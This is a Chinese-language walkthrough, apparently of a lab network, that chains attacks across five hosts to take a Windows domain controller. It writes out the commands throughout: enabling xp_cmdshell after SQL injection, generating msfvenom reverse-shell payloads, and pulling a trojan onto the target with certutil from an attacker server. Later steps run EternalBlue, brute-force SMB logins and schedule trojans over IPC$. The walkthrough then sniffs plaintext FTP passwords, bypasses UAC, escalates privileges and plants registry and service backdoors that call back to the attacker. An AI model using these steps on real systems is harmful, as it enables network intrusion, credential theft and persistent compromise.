# 0x02 入侵1号机

   1号机模拟外网web应用，找到注入点  

![](../Images/1e8fb977c9756dc5c827f4fbd4109855.png)

 判断为整形盲注，直接sqlmap跑一下权限.  

  

![](../Images/1e575ce2d1ecbdef50c44b4742b7c4b4.png)

 Sqlserver 2008数据库sa权限,2008数据库默认禁用xp\_cmdshell，需要手动开启。

EXEC sp\_configure 'show advanced options',1//允许修改高级参数

RECONFIGURE

EXEC sp\_configure 'xp\_cmdshell',1  //打开xp\_cmdshell扩展

RECONFIGURE

  开启后直接从注入点利用xp\_cmdshell，执行系统命令添加账户等操作。我这里选择远程下载木马，运行木马对系统进行控制。生成木马并把木马放在192.168.31.135 web上提供下载。  

  

msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.31.45 lport=4444 -f exe > /home/1.exe //生成msf木马文件  

certutil -urlcache -split -f http://192.168.31.135/test.exe c:\\1.exe //远程下载木马程序

# 0x03 入侵2号机

   通过路由转发对目标内网ms17-010漏洞主机进行探测。  

![](../Images/b654f39ce567fe9954ff208524922b85.png)

use auxiliary/scanner/smb/smb\_ms17\_010

set rhosts 192.168.192.1/24

set threads 50

Run

![](../Images/e105b3f0c8ba499e243b35ec3f849da6.png)

![](../Images/a99ee170a294220d8c67ff733d7e242e.png)发现一台存在ms17-010 漏洞主机2号机，并设置exp进行攻击。

use exploit/windows/smb/ms17\_010\_eternalblue

set payload windows/x64/meterpreter/reverse\_tcp

set lhost 192.168.31.45

set lport 6666

set rhosts 192.168.192.135

Run

![](../Images/54b1ab44a86ad65247d3d6730641dbe7.png)

通过远程溢出拿下2号机，添加用户开启3389，3389端口转发。

![](../Images/5bf3b4d9ac4c5a12564a4f305b1a3405.png)

![](../Images/725ef32ffe0965a0e4f5d4950411906f.png)

run getgui -e  //开启3389端口  

portfwd add -l 1111 -p 3389 -r 192.168.192.135//将192.135主机3389转发本机111  

rdesktop -u 账号  -p 密码    本机ip:端口    // 远程连接  

![](../Images/d7b6a90e50cc3bf4d37f2ec919c7a79d.png)

可以再添加一条路由继续进行扫描扩大战果。

# 0x04 入侵3号机

![](../Images/a75a023c44a578d87d45e3a8f7019d9c.png)

  

use auxiliary/scanner/smb/smb\_login

set rhosts 192.168.192.1/24

set user\_file /home/1.txt

set pass\_file /home/2.txt

set threads 50

Run

![](../Images/27b0d9bfa2ad3f48a31941451569d81a.png)

192.168.192.129 弱口令 administrator 123456，目标主机未开启3389，利用ipc入侵，回到2号机shell会话上 session -i 2 shell进入交互会话。

  

![](../Images/b5bbcfd2f1af7c5000eed0676fb99ab8.png)

![](../Images/30f34f6470471e3a1e20afee1b4150de.png)

![](../Images/4295a0c7faa392331236b3768533ab3f.png)

![](../Images/02f072976266cc28370afb75080e85d0.png)

copy c:\\\\1.exe \\\\192.168.192.129\\c$    //将本地c盘1.exe 拷贝到目标c盘  

net time \\\\192.168.192.129    //查看目标时间  

at \\\\192.168.192.129 23:59 c:\\\\1.exe   // 根据时间添加事件，时间一到执行木马

# 0x05 入侵4号机

利用3号机反弹的shell进行arp嗅探。

![](../Images/4b0257e35a94ac9a84919be711c0838d.png)

load sniffer //加载嗅探模板  

sniffer\_interfaces //列出主机网卡

sniffer\_start \[数值\]  //开启监听  

sniffer\_dump 2 1.cap //导出监听到的数据为1.cap  

![](../Images/8798a6a5a689a8799a2c0f051b4fc945.png)

用户登陆ftp，会被嗅探到明文密码。

![](../Images/e421cbaf9c54e9c566944cb475b6d8ed.png)

**解cap嗅探包。  
**

**use auxiliary/sniffer/psnuffle**

**set pcapfile 1.cap**

**run**

**![](../Images/c9a55db0f6428b4913a7964c13a6e012.png)**

得到ftp明文木马，然后远程到一台主机通过ftp上传webshell 大马。

![](../Images/845eda867b83a4a9aa4e7c008cfc4b29.png)

![](../Images/73cb36b3dd5f24ceda8f02ce63418cb8.png)

进入大马，找到可读写目录上传木马。

![](../Images/e5fda87237e83f8c71c7b802744c4b6c.png)

kali设置好监听等待木马执行。

![](../Images/4f0390c80510385cd5e2fa14017954bf.png)

![](../Images/c18dfdc1f2784997d927e01f468ec6d5.png)

执行并接收，权限很低利用getsystem提权失败。

  

进入shell，systeminfo命令查看已打的补丁，发现可以用ms15-051进行提权。

![](../Images/f81ac8e118288c7975f527af9097e1ee.png)

![](../Images/d34ffa4b4902339c8e5532cd4890bb9a.png)

额。。。。。好像提权失败了，换思路先绕过UAC.

![](../Images/98faca451557c763cb04ad20bca1a3f1.png)

set session 4

Run

返回一个新的shell,进入返回的新shell，直接getsystem进行提权。

![](../Images/be1eff3e62af3dc5ed6f2d401e0f5151.png)

![](../Images/a03c7ec95ff599be1617e08d253e9282.png)

提权成功，接下来读取明文密码。

![](../Images/708b34de4356e2684c29eecfae0cfb42.png)

读取失败了，但是不要着急我们把shell注入到一个实体system进程中。

# 0x06 拿下域控制器5号机

有了域控账户密码可以在域里面畅通无阻，继续用ipc拿下域控制器。

![](../Images/40063833cad515d87d3646e298b9286b.png)

![](../Images/dff0ac9e0e39b4ec7722286d3da49566.png)

![](../Images/a11f7b80ca68b834c6644c7c0631e034.png)![](../Images/811e81f8f80a62329cb371c6c09ffb11.png)

利用域管理员账号密码进行ipc入侵，kali设置监听得到反弹shell。

![](../Images/78580352c1d34346d3826075faf81508.png)

run getgui -e  //开启3389端口  

portfwd add -l 1111 -p 3389 -r 192.168.192.132  

rdesktop -u administrator@guguyu.com -p P@ssw0rd 192.168.2.68:1111  

![](../Images/90a9cc815734c4e5256b82990bc39daa.png)

成功拿下域控制器！

![](../Images/f07a127c81783829bbd6f764dd805d31.png)  

run persistence -X -i 5 -p 4444 -r 192.168.31.45 //向注册表写入后门文件 开机自启 每5秒反弹一次shell

![](../Images/4f3f732c004015ea0356c6d10a7c6ffc.png)

run metsvc //在主机上创建一个监听31337端口的后门服务
